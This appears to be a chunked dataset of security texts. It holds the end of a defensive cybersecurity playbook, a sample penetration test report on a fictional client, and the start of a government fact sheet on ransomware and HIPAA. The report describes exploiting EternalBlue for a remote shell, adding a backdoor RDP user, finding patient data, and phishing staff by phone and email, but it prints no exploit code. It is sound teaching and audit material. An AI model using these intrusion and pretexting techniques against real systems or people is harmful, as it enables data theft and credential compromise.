    "text": "something important despite meaning nothing than it is to choose and implement tactics that work. You look better longer, too, because whereas a cybersecurity strategy can go on meaning nothing a really long time tactics that mean nothing get noticed right away. Cybersecurity tactics, meanwhile, are where the rubber meets the road. They are the bat striking the ball. They are literally the packets smacking the server. They are the way you “do the thing you do to the things you have” to achieve cybersecurity. And that’s hard to plan out. That said, here are a few steps to point you in the right direction: \u0001 Draw out the interactions and the separations between your systems. \u0001 This should be based on the packet activity you find on the network. It’s like making a hybrid physical and logical network map with arrows of interactions based on protocol activity. Determine how anything that should be separated or controlled. Voila, that’s you applying tactics! \u0001 List all of your network processes. \u0001 This includes server backups, server administration, remote desktop support services, etc. Know exactly what systems and people they can interact with, then determine what they should be interacting with. How you control that authorization is you applying tactics. \u0001 Do the same for wireless, physical room and asset access, and telephone systems. \u0001 Determine which tactics you need to apply to assure control. \u0001 Now take a step back. \u0001 Make sure that all of the tactics you chose fit with the overall company strategy and resources and that workflow is not hampered. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 3: LOOKING DOWNFIELD 24 Learn to Work with Non-Technical Colleagues Humans are social animals. The majority of us like being liked, like belonging to a group or a team, like standing up for a cause, and like being part of a community. Or even if we don’t “like” it doesn’t mean we want to be pushed out of it, either. The problem is just because we like it doesn’t mean we’re good at it. A lack of communication with the people holding the resources will greatly affect your ability to build the security that’s needed. Here are some tips for making communication run smoother: \u0001 Don’t assume because it makes sense to you that it makes sense to everyone. \u0001 It’s normal for people not to like change. Therefore you need to consider this hurdle anytime you’re proposing change and prepare for it by showing that change is the new normal. After all, the criminal hackers entering organizations like yours have had plenty of success, and they change tools and techniques all the time. \u0001 Communicate with your coworkers or your boss according to their capabilities. \u0001 If they are tech savvy, don’t talk down to them. If they aren’t technical, don’t go to them with tech-heavy reasoning. \u0001 Think about the money before you talk. \u0001 Your company is in business to make money. Show value. Provide ways to show that",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 16
    }
  },
  {
    "text": "according to their capabilities. \u0001 If they are tech savvy, don’t talk down to them. If they aren’t technical, don’t go to them with tech-heavy reasoning. \u0001 Think about the money before you talk. \u0001 Your company is in business to make money. Show value. Provide ways to show that additional security can replace some of the things you are currently doing. Or if that’s not possible, show how various solutions can reduce downtime, add quality, or improve efficiency. \u0001 Don’t waste their time. \u0001 Don’t let them even feel for a moment that you’re wasting their time. That means being prepared and polished. \u0001 Never say, “I told you so.” \u0001 Don’t bring up that time your suggestion got ignored and something bad happened. Don’t make it seem like you did them a favor or that you expect something for your brilliance and insight. Start from zero each time. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 3: LOOKING DOWNFIELD 25 The Big Picture In cybersecurity, you’re dealing with conflicting information from authorities struggling themselves to understand what makes or defines “good” security. Some of the most common questions leave most security professionals simply guessing as to what’s the right answer: Is it more secure to harden servers or use a firewall? When do you need two-factor authentication? Which is better security, certificates or passwords? Do reverse proxies actually provide more security? That said, cybersecurity is also maturing as a field. Every year, there’s less misinformation and more and more people trying to come to terms with the fact that they were at least a little wrong last year. But humility is not for everyone, and security is a humbling experience for everyone. It’s like in sports how you can keep thinking it was a great game right up until the point when you wondering how you lost. Things don’t tend to just gradually grow bad — they suddenly do, surprisingly so, from one breath to the next, the same way you go from running like a gazelle to sliding across the ground with no idea why you fell. Luckily, the online cybersecurity community has more advice than you ever need — even if it does conflict a lot. And one of the great things about such a huge, helpful, self-interested community of humbled people is that they really want to help. But you need to be careful with that if you want to really set yourself up for long-term success. What happens is that by relying on the cybersecurity community for your answers you will ultimately get mostly the answers that allow the security community, especially vendors to profit. This skews the directions future security research takes. It skews the tools that security vendors make and sell. Most of all, it skews the knowledge you need to know in order to improve your own security. What you’ll eventually learn is that good security professionals tell you what you want to know. But great security professionals tell you what you need to",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 17
    }
  },
  {
    "text": "that security vendors make and sell. Most of all, it skews the knowledge you need to know in order to improve your own security. What you’ll eventually learn is that good security professionals tell you what you want to know. But great security professionals tell you what you need to know. You’ll know when it’s the latter because it will frustrate you and seem like a pain in the ass and leave you wondering if you can’t just buy and install some product. You can. But without putting the work behind any product you install to make it fit your environment and your processes then you won’t fix the problem. More likely, you will create a set of new ones. The cybersecurity field hasn’t matured enough to know what’s right all the time. It has a problem of letting go of what isn’t working. It still tries to base success on effort rather than security. So the first thing you need to do to improve yourself is to stop repeating things like “Everyone gets hacked eventually” and “If a hacker really wants in they’ll get in” and “Security is a process.” Because if our humbling experiences have told us anything, it’s that security isn’t a slogan or a comforting phrase. It’s the toughest riddle you’ll ever have to solve before the Troll comes out from under the bridge and eats you. And every riddle has a different answer every time. It’s constantly changing based on the environment you’re in. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 3: LOOKING DOWNFIELD 26 So as you set out to win in the cybersecurity field remember that the security community is a resource and not an answer, just like Wikipedia is a resource and not a term paper. What you get from it will rarely fit your needs as-is. You still need to figure out how to answer your own riddle, and that takes knowing your environment, your employees, and how it all works together (aka the Big Picture). You need to know where the interactions are, what resources are being used and from where, as well as who has authorized access to what. And you need to do that constantly because every second, the riddle changes a little bit. Or else before you know it, it’s changed a lot and you’re not ready for what happens next. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nTM At Barkly, we believe security shouldn’t have to The Institute for Security and Open Methodologies be difficult to understand or implement. That’s (ISECOM) is a non-profit, open research organization why we support projects like this one and why focused on all things related to security and hacking. we’re dedicated to providing companies like ISECOM created and maintains the Open Source yours strong endpoint protection that’s fast, Security Testing Methodology Manual (OSSTMM) and affordable, and easy-to-use. Hacker Highschool designed to teach cybersecurity to teens. Learn more at www.barkly.com. Learn more at www.isecom.org. CREATIVE COMMONS ATTRIBUTION-NODERIVATIVES 4.0 2016 ISECOM AND BARKLY",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 18
    }
  },
  {
    "text": "ISECOM created and maintains the Open Source yours strong endpoint protection that’s fast, Security Testing Methodology Manual (OSSTMM) and affordable, and easy-to-use. Hacker Highschool designed to teach cybersecurity to teens. Learn more at www.barkly.com. Learn more at www.isecom.org. CREATIVE COMMONS ATTRIBUTION-NODERIVATIVES 4.0 2016 ISECOM AND BARKLY",
    "metadata": {
      "doc_id": "Playbook",
      "chunk_id": 19
    }
  },
  {
    "text": "JANUARY 1, 2020 Sample Penetration Test Report - Example Institute Prepared By sales@purplesec.us\\nJANUARY 1, 2020 Document History: Version Date Person Notes, Comments, Reasons 1.0 sales@purplesec.us 3\\nJANUARY 1, 2020 Table of Contents 1.1 Executive Summary ................................................................................................ 4 1.2 Overview ....................................................................................................................... 4 1.3 High-Level Test Outcomes .......................................................................................... 4 1.4 Overall Risk Rating .............................................................................................. 5 1.5 Prioritized Recommendations ............................................................................... 5 2.1 Test Scope and Method ........................................................................................... 6 2.2 Extent of Testing ........................................................................................................... 6 2.3 Test Scope Summary ............................................................................................ 6 3.1 Internal Phase ......................................................................................................... 7 3.2 Phase Summary .................................................................................................... 7 3.3 Actions Taken ...................................................................................................... 7 4.1 External Phase ...................................................................................................... 16 4.2 Phase Summary .................................................................................................. 16 4.3 Actions Taken .................................................................................................... 16 5.1 Conclusions ................................................................................................................... 24 5.2 Most Likely Compromise Scenarios ................................................................... 24 5.3 Implications................................................................................................................. 24 References.................................................................................................................... 25 sales@purplesec.us 4\\nJANUARY 1, 2020 1.0 Executive Summary 1.1 Overview Example Institute (CLIENT) engaged PurpleSec, LLC to conduct penetration testing against the security controls within their information environment to provide a practical demonstration of those controls’ effectiveness as well as to provide an estimate of their susceptibility to exploitation and/or data breaches. The test was performed in accordance with PurpleSec Information Security Penetration Testing Method. PurpleSec’s Information Security Analyst (ISA) conducted all testing in coordination with CLIENTs Information Technology (IT) staff members to ensure safe, orderly, and complete testing within the approved scope. CLIENT’s information environment is protected by endpoint antivirus and administrative controls managed by an Active Directory. The environment contains numerous vulnerabilities, including some very serious security flaws such as EternalBlue which makes them susceptible to data breaches and system takeovers. Highly important files which contain HIPAA and payment information are easily accessible and very visible; putting the CLIENT at great risk to compliance violation and potentially subject to large fines and/or loss of business reputation. 1.2 High-Level Test Outcomes Internal penetration test: Intended to simulate the network-level actions of a malicious actor who gained a foothold within the internal network zone. Overall, CLIENT presents a high-risk attack surface with major critical vulnerabilities that allowed complete root access to multiple systems exist within CLIENT’s critical infrastructure. The EPO server and the Remote Desktop Server were both susceptible to EternalBlue; a shell was opened on both remotely by exploiting the SMBv1 vulnerability using a Publicly available exploit module which remotely attacked the spoolsv.exe service via port 445 (SMB). The Remote Desktop server contained numerous user files of CLIENT’s staff members. Traversing the user profile data revealed many files that contained private patient healthcare information including diagnostics, health insurance information, and transaction receipts. The ability to control the system as NT Authority makes data exfiltration trivial as any user specific permissions are not applied to NT Authority user. Two other systems had the SChannel (CVE-2014-6321) vulnerability which makes them susceptible to DoS via code over Schannel. A script can be written to exploit this vulnerability and cause the receiving system to open multiple threads and lockout the processor. This was not exploited as PurpleSec does not use DDOS in its testing. sales@purplesec.us 5\\nJANUARY 1, 2020 1.3 Overall Risk Rating",
    "metadata": {
      "doc_id": "PurpleSec - Sample-Penetration-Test-Report",
      "chunk_id": 0
    }
  },
  {
    "text": "susceptible to DoS via code over Schannel. A script can be written to exploit this vulnerability and cause the receiving system to open multiple threads and lockout the processor. This was not exploited as PurpleSec does not use DDOS in its testing. sales@purplesec.us 5\\nJANUARY 1, 2020 1.3 Overall Risk Rating Having considered the potential outcomes and the risk levels assessed for each documented testing activity, PurpleSec considers Example Institute’s overall risk exposure regarding malicious actors’ attempts to breach and/or control resources within their information environment to be EXTREME (as determined using PurpleSec Risk Matrix). Fig. 1-1: PurpleSec Risk Matrix 1.4 Prioritized Recommendations Based on the results achieved during the test project PurpleSec makes the following recommendations (presented by order of priority): • Patch critical systems (Microsoft Security Bulletin MS17-010 – Critical) • Run Vulnerability Scans on at least monthly basis (scan-patch-scan again) • Change passwords (10+ complex characters) on all systems that contain ePHI. • Social Engineering training for every employee. • Disable SMB and spoolsvc on McAfee server. sales@purplesec.us 6\\nJANUARY 1, 2020 2.0 Test Scope and Method 2.1 Extent of Testing Example Institute engaged PurpleSec to provide the following penetration testing services: • Network-level, technical penetration testing against hosts in the internal networks. • Network -level, technical penetration testing against internet facing hosts. • Social Engineering, phone phishing against CLIENT employees. • Social Engineering, email phishing against CLIENT employees. 2.2 Test Scope Summary The following information environment zones were included in the scope of the penetration test: • Internal Network: Example Institute’s general internal networks. The test was conducted in two phases: • Internal stage: Starting from the internal network zone. Intended to simulatethe network-level actions of a malicious actor who gained a foothold within the internal network zone. (Remainder of page left intentionally blank) sales@purplesec.us 7\\nJANUARY 1, 2020 3.0 Internal Phase 3.1 Phase Summary PurpleSec’s ISA conducted various reconnaissance and enumeration activities. Port and vulnerability scanning, as well as other reconnaissance activities revealed serious security holes. The most concerning vulnerabilities allow complete system takeover on important servers, most critically the McAfee Security server; compromise of which could allow a potential attacker to render the endpoint security for the entire internal network inoperable or ineffective. Once server compromise was achieved, directory traversal to search for important data was conducted. The analyst was able to identify many directories with private patient data and numerous other data that would fall under HIPAA and PCI compliance. 3.2 Actions Taken To determine and practically demonstrate the feasibility of expanding access given a foothold within the internal network, the ISA conducted the following activities: From Zone: Internal network Via: N/A To Zone: Internal network Method: Network-level penetration testing Current Zone Activities: The ISA used a SecureSensor deployed inside Example Institute’s facilities to conduct port, service, and vulnerability scanning as well as other reconnaissance techniques within Example Institute’s internal networks. Vulnerabilities were found and validated. SMB vulnerability ETERNALBLUE was exploited to gain root level access to multiple critical systems including the McAfee system security server.",
    "metadata": {
      "doc_id": "PurpleSec - Sample-Penetration-Test-Report",
      "chunk_id": 1
    }
  },
  {
    "text": "a SecureSensor deployed inside Example Institute’s facilities to conduct port, service, and vulnerability scanning as well as other reconnaissance techniques within Example Institute’s internal networks. Vulnerabilities were found and validated. SMB vulnerability ETERNALBLUE was exploited to gain root level access to multiple critical systems including the McAfee system security server. Microsoft Windows SMBv1 Multiple Vulnerabilities (ETERNALBLUE) CVE-2017-0143, CVE-2017-0144, CVE-2017-0145, CVE-2017-0146, CVE-2017-0148 sales@purplesec.us 8\\nJANUARY 1, 2020 EternalBlue is an exploit developed by the NSA and leaked via ShadowBrokers in 2017. Recent similar “Eternal” exploits have been developed to attack systems from Windows Server 2000 up to the latest OS releases. EternalBlue gives the attacker complete root access to the target system via a buffer overflow when sending specially crafted SMB packets to the server. The overflow executes code in a target service such as spoolsv.exe. Once the remote shell is opened, the attacker has control of the system as “NT Authority” which is kernel access in Windows systems, allowing complete system takeover. The SMB SMBv1 vulnerability opens the system up to the possibility of Ransomware attacks such as WannaCry, which are delivered as payloads via EternalBlue type attacks. PurpleSec’s ISA was able to gain root access to the system <hostname> 192.168.1.235 and <hostname> 192.168.1.222 (McAfee Security Server) via CVE-2017- 144. The analyst attempted to connect to the remote system via the SMB port 445 and without any credentials as a reconnaissance step to validate whether the remote system was honoring SMB connection requests. Once the connection was validated, the analyst used publicly available tools to exploit the vulnerability. Prompt changes to C:\\windows\\system 32, indicating that a remote shell has been established at the root of the target OS. sales@purplesec.us 9\\nJANUARY 1, 2020 From here the analyst performs several directory traversals to move to the root drive and begin reconnaissance for critical files such as patient information, ePHI, PII, and payment information. Traversing user profile document folders revealed several folders with sensitive, confidential patient and hospital information. Due to attaining access as the NT Authority user, no permissions settings or passwords prevent access to any of the files on the system. User profiles contain various files that, if breached, could make Example Institute liable for fines. In addition to the noted HIPAA and ePHI files, a PFX certificate file was also located on the server. sales@purplesec.us 10\\nJANUARY 1, 2020 PFX Files are encrypted files which may contain data or be used as secret keys to access other encrypted data or systems. PFX files have been breached under research conditions Additionally, if an attacker as root system accesses the %Appdata%\\Microsoft\\Protect\\<SID>\\BK-<NETBIOSDOMAINNAME> path, they can use the stored backup key here to take over all the identities and secrets in the domain. I recommend any secrets on systems be evaluated at the minimum This risk of this critical vulnerability can be further demonstrated. With root access an attacker can do any administrative and system level action without any need for passwords or logins. Using this vulnerability, the ISA was also able to create a local",
    "metadata": {
      "doc_id": "PurpleSec - Sample-Penetration-Test-Report",
      "chunk_id": 2
    }
  },
  {
    "text": "secrets on systems be evaluated at the minimum This risk of this critical vulnerability can be further demonstrated. With root access an attacker can do any administrative and system level action without any need for passwords or logins. Using this vulnerability, the ISA was also able to create a local RDP user that would allow me Remote Desktop access to the server using a username and password of my choice. There is further risk of privilege escalation because NT Authority user can promote any other users to Admin level access, including Domain Admin, if the target system is an Active Directory server or has rights to configure Domain settings remotely. The McAfee Security Server (192.168.1.222) was vulnerable to the same ETERNALBLUE exploit. As SMB and spoolsv.exe services were running on the McAfee server the attack was executed using the same method described above. Initially the shell failed to open, which is common with this exploit; a retry resulted in successful execution. sales@purplesec.us 11\\nJANUARY 1, 2020 SSL Version 2 and 3 Protocol Detected: A network reconnaissance scan detected multiple hosts with a vulnerable version of SSLv2 and SSLv3. The remote service accepts connections encrypted using SSL 2.0 and/or SSL 3.0. These versions of SSL are affected by several cryptographic flaws, including: - An insecure padding scheme with CBC ciphers. - Insecure session renegotiation and resumption schemes. An attacker can exploit these flaws to conduct man-in-the-middle attacks or to decrypt communications between the affected service and clients. Although SSL/TLS has a secure means for choosing the highest supported version of the protocol (so that these versions will be used only if the client or server support nothing better), many web browsers implement this in an unsafe way that allows an attacker to downgrade a connection (such as in POODLE). Therefore, it is recommended that these protocols be disabled entirely. NIST has determined that SSL 3.0 is no longer acceptable for secure communications. As of the date of enforcement found in PCI DSS v3.1, any version of SSL will not meet the PCI SSC's definition of 'strong cryptography'. Hosts Affected: 192.168.1.248 192.168.1.230 192.168.1.251 192.168.1.39 192.168.1.252 192.168.1.204 192.168.1.221 192.168.1.198 192.168.1.205 192.168.1.200 192.168.1.182 192.168.1.194 Affected hosts were validated with a network level cipher scan using the nmap tool. Analyst targeted the scan at these specific hosts using a script that would display the cipher suite information for blocks of open ports on the targeted systems. sales@purplesec.us 12\\nJANUARY 1, 2020 The output scan was filtered to display only those systems which contained insecure versions of SSL. All the below affected hosts were validated to contain the vulnerable SSL. sales@purplesec.us 13\\nJANUARY 1, 2020 sales@purplesec.us 14\\nJANUARY 1, 2020 MS14-066: Vulnerability in Schannel Could Allow Remote Code Execution (2992611)(WINSHOCK) The remote Windows host is affected by a remote code execution vulnerability due to improper processing of packets by the SecureChannel (Schannel) security package. An attacker can exploit this issue by sending specially crafted packets to a Windows server. Note that this plugin sends a client Certificate TLS handshake message",
    "metadata": {
      "doc_id": "PurpleSec - Sample-Penetration-Test-Report",
      "chunk_id": 3
    }
  },
  {
    "text": "The remote Windows host is affected by a remote code execution vulnerability due to improper processing of packets by the SecureChannel (Schannel) security package. An attacker can exploit this issue by sending specially crafted packets to a Windows server. Note that this plugin sends a client Certificate TLS handshake message followed by a CertificateVerify message. Some Windows hosts will close the connection upon receiving a client certificate for which it did not ask for with a CertificateRequest message. In this case, the plugin cannot proceed to detect the vulnerability as the CertificateVerify message cannot be sent. EXPLOIT: The exploit for this vulnerability is a remote code execution that typically results in a sales@purplesec.us 15\\nJANUARY 1, 2020 Denial of Service (DoS) Attack. Due to the nature of the testing, this exploit is out of scope for the exercise. Outsider Risk Rating: Insider Risk Rating: EXTREME Bottom Line: Nearly all CLIENT’s internal networks hosts appear to be properly patched and up-to- date. Attack vectors are available to an adversary who targeted CLIENT. Considering CLIENT’s lack of IT personnel or Security Engineer, an attacker could find success through Social Engineering or Physical attack methods due to the lack of training and resources found during this penetration testing. Recommendations: • Disable SMB on all systems where it is not required for business purposes. The service may be shut down via GPO on the domain, or through manual service disabling on local admin accounts. • Disable spoolsvc.exe and other non-essential processes on Critical Security Infrastructure such as the McAfee Security Server. Processes running increase the attack surface of the systems. Disabling these services can help harden the systems and create a smaller, more secure risk landscape. • Disable SSLv2 and SSLv3 on any system where legacy encryption is not necessary. Most applications use better encryption built-in but use SSL as a fallback option when needed for legacy support. (Remainder of page left intentionally blank) sales@purplesec.us 16\\nJANUARY 1, 2020 4.0 External Phase 4.1 Phase Summary The external phase of the pentest focused on the assets which are publicly accessible. Reconnaissance and scanning were conducted to identify opportunities for intrusion or malicious modification of the systems. Attacks were launched from PurpleSec network via Internet to the externally accessible assets at CLIENT using BurpSuite and network scanner NMAP. 4.2 Actions Taken To determine the risk level of CLIENT’s externally accessible hosts and servers, the analyst conducted internet-level scanning and analysis. From Zone: Internet Via: N/A To Zone: External Network Method: Internet penetration testing Current Zone Activities: xxx.xxx.93.188 The server’s certificate is not valid for the hostname. Cert is issued to wwcaws.keixna mplecom, wwcwas.ekxina mple.com, but you can reach the https certificate through this IP address. The hostname is technically not covered by the cert. HSTS is not enforced The application fails to prevent users from connecting to it over unencrypted connections. This opens the possibility of man-in-the-middle attacks performed on the site by users who visit unencrypted links. To remedy this, add a response header with the name",
    "metadata": {
      "doc_id": "PurpleSec - Sample-Penetration-Test-Report",
      "chunk_id": 4
    }
  },
  {
    "text": "technically not covered by the cert. HSTS is not enforced The application fails to prevent users from connecting to it over unencrypted connections. This opens the possibility of man-in-the-middle attacks performed on the site by users who visit unencrypted links. To remedy this, add a response header with the name “Strict-Transport-Security” with an acceptable max-age expiration time. Nmap Warnings: 64-bit block cipher 3DES vulnerable to SWEET32 attack Broken cipher RC4 is deprecated by RFC 7465 Ciphersuite uses MD5 for message integrity Key exchange (dh 2048) of lower strength than certificate key Key exchange (ecdh_x25519) of lower strength than certificate key sales@purplesec.us 17\\nJANUARY 1, 2020 sales@purplesec.us 18\\nJANUARY 1, 2020 xxx.xxx.11.67 The server’s certificate is not valid for the hostname. Cert is issued to mail.ecxasakminp le.com, but you can reach the https certificate through this IP address. The hostname is technically not covered by the cert. Nmap Warnings: 64-bit block cipher 3DES vulnerable to SWEET32 attack Broken cipher RC4 is deprecated by RFC 7465 Ciphersuite uses MD5 for message integrity Key exchange (dh 1024) of lower strength than certificate key xxx.xxx.11.82 HSTS is not enforced. The application fails to prevent users from connecting to it over unencrypted connections. This opens the possibility of man-in-the-middle attacks performed on the site by users who visit unencrypted links. To remedy this, add a response header with the name “Strict-Transport-Security” with an acceptable max-age expiration time. Nmap Warnings: 64-bit block cipher 3DES vulnerable to SWEET32 attack Broken cipher RC4 is deprecated by RFC 7465 Ciphersuite uses MD5 for message integrity Key exchange (dh 1024) of lower strength than certificate key Key exchange (secp256r1) of lower strength than certificate key sales@purplesec.us 19\\nJANUARY 1, 2020 xxx.xxx.119.235 Nmap Warnings: 64-bit block cipher 3DES vulnerable to SWEET32 attack 64-bit block cipher IDEA vulnerable to SWEET32 attack Key exchange (secp256r1) of lower strength than certificate key sales@purplesec.us 20\\nPEN TEST REPORT: EXAMPLE INSTITUTE JANUARY28,2019 CONFIDENTIAL – EXAMPLE INSTITUTE USE ONLY 20\\nPEN TEST REPORT: EXAMPLE INSTITUTE JANUARY28,2019 xxx.xxx.11.66 The server’s certificate is not valid for the hostname. Cert is issued to 192.168.168.168, but you can reach the https certificate through this IP address. The hostname is technically not covered by the cert. HSTS is not enforced. The application fails to prevent users from connecting to it over unencrypted connections. This opens the possibility of man-in-the-middle attacks performed on the site by users who visit unencrypted links. To remedy this, add a response header with the name “Strict-Transport-Security” with an acceptable max-age expiration time. xxx.xxx.91.182 The server’s certificate is not valid for the hostname. Cert is issued to web.ceaxsakminp.l e.com, www.web.example.com, but you can reach the https certificate through this IP address. The hostname is technically not covered by the cert. HSTS is not enforced. The application fails to prevent users from connecting to it over unencrypted connections. This opens the possibility of man-in-the-middle attacks performed on the site by users who visit unencrypted links. To remedy this, add a response header with the name “Strict-Transport-Security” with an acceptable max-age expiration time. xxx.xxx.167.106 HSTS",
    "metadata": {
      "doc_id": "PurpleSec - Sample-Penetration-Test-Report",
      "chunk_id": 5
    }
  },
  {
    "text": "enforced. The application fails to prevent users from connecting to it over unencrypted connections. This opens the possibility of man-in-the-middle attacks performed on the site by users who visit unencrypted links. To remedy this, add a response header with the name “Strict-Transport-Security” with an acceptable max-age expiration time. xxx.xxx.167.106 HSTS is not enforced. The application fails to prevent users from connecting to it over unencrypted connections. This opens the possibility of man-in-the-middle attacks performed on the site by users who visit unencrypted links. To remedy this, add a response header with the name “Strict-Transport-Security” with an acceptable max-age expiration time. Cookie missing HttpOnly The XSRF-TOKEN Cookie, if this site is indeed intending to use it as some form of CSRF Prevention, should be set to HttpOnly that way it cannot be read or modified by client-side JavaScript 4.3 Actions taken To determine and practically demonstrate the feasibility of gaining physical access to facilities Non-Public and High-Security zones or gaining of unauthorized, authenticated access to CLIENT’s workstations, the ISA conducted the following activities: From Zone: External communications Via: N/A To Zone: Internal network Nexus Point: Frontline staff members Method: Telephone-based pretexting sales@purplesec.us 21\\nPEN TEST REPORT: EXAMPLE INSTITUTE JANUARY28,2019 Current Zone Activities: PurpleSec’s Social Engineer performed phone-based social engineering with the goal of getting credentials and have staff perform tasks on their workstation. This is intended to simulate a malicious actor attempting to gain credentials and a foothold in the environment by a phone call. 10 phone contacts were made with 3 Full Breach’s with multiple (6) passwords given to the Social Engineer. One contact stated most of the systems use the same password for everyone. Nexus Point Activities: PurpleSec‘s Social Engineer called the numbers over a three-day period and spoke with CLIENT staff members. Each time a live staff member was reached, the Social Engineer claimed to be a technical support worker authorized to contact CLIENT’s personnel to provide critical support. If challenged, the Social Engineer would then drop Information Security Staff member names in a statement that they are working on their behalf. The Social Engineer’s program included the following activities: • Requesting that the user provide his/her domain username. • Feigning an attempt to perform a technical operation on the user’s behalf, and then requested that the user provide his/her domain password when the operation ‘failed.’ Three of the personnel engaged by the Social Engineer provided domain usernames or passwords. The passwords revealed were eight characters long with only alphanumeric characters. Cloud-based servers may be able to break these passwords within a manner of weeks or days depending on the resources allocated to password cracking efforts. PurpleSec recommends increased complexity and length. Risk Rating: MEDIUM Bottom Line: It was found to be feasible to induce CELxIa mple’s users to provide logon information through deceptive telephone communications. Recommendations: • Conduct Social Engineering Training to help staff properly validate the identity of the phone callers and do not provide confidential credential information. • Ensure procedures have employees report unusual or suspicious",
    "metadata": {
      "doc_id": "PurpleSec - Sample-Penetration-Test-Report",
      "chunk_id": 6
    }
  },
  {
    "text": "found to be feasible to induce CELxIa mple’s users to provide logon information through deceptive telephone communications. Recommendations: • Conduct Social Engineering Training to help staff properly validate the identity of the phone callers and do not provide confidential credential information. • Ensure procedures have employees report unusual or suspicious phone calls to appropriate staff. • Change password requirements to at least 10 complex characters, including alpha-numeric and special characters. sales@purplesec.us 22\\nPEN TEST REPORT: EXAMPLE INSTITUTE JANUARY28,2019 4.4 Current Zone Activities: PurpleSec’s Social Engineer worked CwLitIh staff to compile 175 email addresses to perform the social engineering test. A phishing template with appropriate signage and logos was created. Nexus Point Activities: PurpleSec’s Social Engineer sent a phishing e-mail to all the in-scope addresses. The e- mail originated from a spurious IT support company and claimed to be a legitimate technical support request authorized by CLIENT’s IT Department. The e-mail also requested that the user navigate to an PurpleSec-controlled Website and: • Provide his/her domain username, • Provide his/her e-mail address (in lieu of password), and • Download a benign executable file, • Run the executable locally on his/her workstation. Of the 175 email addresses tested, 13 users interacted with untrusted content (hyperlink) and 9 provided domain usernames/e-mail address. Figure 3.49 – Screenshot showing the email phishing results. Risk Rating: Medium Bottom Line: The response and click rates for CLIENT’s staff tested via email are just under 10% and should be considered a vulnerability for the organization. It should be noted that most malware needs only a single response, and full response from a user to username/password requests may lead to significant breaches. sales@purplesec.us 23\\nPEN TEST REPORT: EXAMPLE INSTITUTE JANUARY28,2019 Recommendations: • While click and interaction rates were calculated as Medium it is highly recommended that CLIENT engage in Cybersecurity awareness training immediately. 5.0 Conclusions 5.1 Most Likely Compromise Scenarios An attacker would most likely start an attack against CLEINT with social engineering techniques. (this is the most successful type of attack) and given that ETERNALBLUE is easily exploited, this is the most likely compromise of the entire system. Attacking the McAfee Security Server would be an ideal first target; once an attacker has attained root access to this system, they can disable all the security controls and systems in place, allowing for much more evasive traversal of the internal network, as well as potentially creating more targets without the hindrance of the security systems. From here, the ideal goals of an attacker would be data exfiltration of ePHI, Personally Identifiable Information (PII) and PCI data - for purposes of fraud, ransom, targeted phishing, sale, etc. - and any payment information that may be available for similar purposes. An adversary would attempt to access to the Domain Controllers to help facilitate network traversal and further compromise of security controls and monitoring systems. With Domain access, complete infrastructure compromise is likely; with this level of access an attacker presents numerous serious security risks to critical and confidential information systems. Internet facing assets",
    "metadata": {
      "doc_id": "PurpleSec - Sample-Penetration-Test-Report",
      "chunk_id": 7
    }
  },
  {
    "text": "attempt to access to the Domain Controllers to help facilitate network traversal and further compromise of security controls and monitoring systems. With Domain access, complete infrastructure compromise is likely; with this level of access an attacker presents numerous serious security risks to critical and confidential information systems. Internet facing assets at CLIENT have little to no interactivity and so pose less of a threat to intrusion through these systems. However, the systems are vulnerable to Man-in-the-middle (MITM) type attacks which could be utilized by an attacker to gain access to private communications and potentially steal passwords to gain further access into the network. 5.2 Implications Based on the above testing activities, the average risk level across the board is EXTREME Complete system compromise is trivially achieved on critical security and file servers, systems that contain myriad important and confidential files which, if breached, can put CLIENT at great risk to large fines and significant business impact. Disable SMB on any system that does not require it for business functionality. Even with recent patches, Windows systems using SMB remain vulnerable to ETERNALBLUE type exploits so long as the service is running. System hardening needs to be implemented immediately to shrink the risk landscape of the infrastructure. Controls and configurations should be centrally managed; management and security systems such as the McAfee server should be secured using sales@purplesec.us 24\\nPEN TEST REPORT: EXAMPLE INSTITUTE JANUARY28,2019 controls designed around Least Privilege and Critical Infrastructure NIST recommendations. Compromise of these systems pose a critical threat. Implement system patching management cycle to ensure that all systems are regularly receiving important security updates from vendors. Revoke or replace PFX files in user profiles as a precaution Data compliance and end user social engineering training should be implemented to promote safer practices. HIPAA data should be contained to ONLY systems that require access to the data; it is encouraged that these systems employ good data at rest encryption and least privilege access controls to prevent unauthorized access. Best practice is to centrally store these types of files on a managed, hardened network location, users should access the files only via network connectors in their in profiles with configured security permissions. References Open Web Application Security Project (OWASP). (2014). Testing Guide v4.0. https://www.owasp.org/images/1/19/OTGv4.pdf Assured Compliance Technology. (2015a). Information Security Project Quality Assurance Manual v1.4. ACT Policy Library. Assured Compliance Technology. (2015b). Information Security Penetration Testing Method. ACT Policy Library. sales@purplesec.us 25",
    "metadata": {
      "doc_id": "PurpleSec - Sample-Penetration-Test-Report",
      "chunk_id": 8
    }
  },
  {
    "text": "U.S. DEPARTMENT OF HEALTH AND HUMAN SERVICES Office for Civil Rights FACT SHEET: Ransomware and HIPAA A recent U.S. Government interagency report indicates that, on average, there have been 4,000 daily ransomware attacks since early 2016 (a 300% increase over the 1,000 daily ransomware attacks reported in 2015).1 Ransomware exploits human and technical weaknesses to gain access to an organization’s technical infrastructure in order to deny the organization access to its own data by encrypting that data. However, there are measures known to be effective to prevent the introduction of ransomware and to recover from a ransomware attack. This document describes ransomware attack prevention and recovery from a healthcare sector perspective, including the role the Health Insurance Portability and Accountability Act (HIPAA) has in assisting HIPAA covered entities and business associates to prevent and recover from ransomware attacks, and how HIPAA breach notification processes should be managed in response to a ransomware attack. 1. What is ransomware? Ransomware is a type of malware (malicious software) distinct from other malware; its defining characteristic is that it attempts to deny access to a user’s data, usually by encrypting the data with a key known only to the hacker who deployed the malware, until a ransom is paid. After the user’s data is encrypted, the ransomware directs the user to pay the ransom to the hacker (usually in a cryptocurrency, such as Bitcoin) in order to receive a decryption key. However, hackers may deploy ransomware that also destroys or exfiltrates2 data, or ransomware in conjunction with other malware that does so. 2. Can HIPAA compliance help covered entities and business associates prevent infections of malware, including ransomware? Yes. The HIPAA Security Rule requires implementation of security measures that can help prevent the introduction of malware, including ransomware. Some of these required security measures include: • implementing a security management process, which includes conducting a risk analysis to identify threats and vulnerabilities to electronic protected health information (ePHI) and implementing security measures to mitigate or remediate those identified risks; • implementing procedures to guard against and detect malicious software; 1 United States 